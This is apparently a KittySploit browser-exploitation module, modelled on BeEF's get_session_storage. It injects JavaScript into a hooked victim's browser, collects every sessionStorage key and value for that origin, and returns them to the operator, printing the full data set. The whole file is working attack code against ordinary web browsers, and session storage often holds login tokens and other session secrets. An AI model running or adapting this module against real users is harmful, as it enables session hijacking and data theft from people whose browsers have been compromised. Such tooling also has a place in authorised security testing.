from kittysploit import *
import json


class Module(BrowserAuxiliary):

	__info__ = {
		"name": "Get Session Storage",
		"description": "Extract all data from sessionStorage on the hooked origin (BeEF get_session_storage)",
		"author": "KittySploit Team",
		"browser": Browser.ALL,
		"platform": Platform.ALL,
		"session_type": SessionType.BROWSER,
	}

	def run(self):
		code_js = """
		(function() {
			try {
				if (!window.sessionStorage) {
					return JSON.stringify({
						error: "sessionStorage is not available",
						available: false
					});
				}

				const storage = {};
				for (let i = 0; i < sessionStorage.length; i++) {
					const key = sessionStorage.key(i);
					storage[key] = sessionStorage.getItem(key);
				}

				return JSON.stringify({
					available: true,
					origin: location.origin || null,
					count: Object.keys(storage).length,
					data: storage
				});
			} catch (e) {
				return JSON.stringify({
					error: e.message,
					available: false
				});
			}
		})();
		"""

		result = self.send_js_and_wait_for_response(code_js, timeout=5.0)

		if not result:
			print_error("Failed to retrieve sessionStorage data")
			return False

		try:
			data = json.loads(result)

			if not data.get("available", False):
				print_error(f"sessionStorage unavailable: {data.get('error', 'unknown')}")
				return False

			storage_data = data.get("data", {})
			count = data.get("count", 0)
			origin = data.get("origin")

			if origin:
				print_info(f"Origin: {origin}")

			if count == 0:
				print_warning("sessionStorage is empty")
				return True

			print_success(f"Found {count} item(s) in sessionStorage:")
			print_info("=" * 80)

			for key, value in storage_data.items():
				display_value = value
				if len(display_value) > 100:
					display_value = display_value[:100] + "..."
				print_info(f"  Key: {key}")
				print_info(f"  Value: {display_value}")
				print_info("-" * 80)

			print_info("=" * 80)
			print_status("Full sessionStorage data (JSON):")
			print_info(json.dumps(storage_data, indent=2))
			return True

		except json.JSONDecodeError as e:
			print_error(f"Failed to parse sessionStorage data: {e}")
			print_debug(f"Raw response: {result}")
			return False
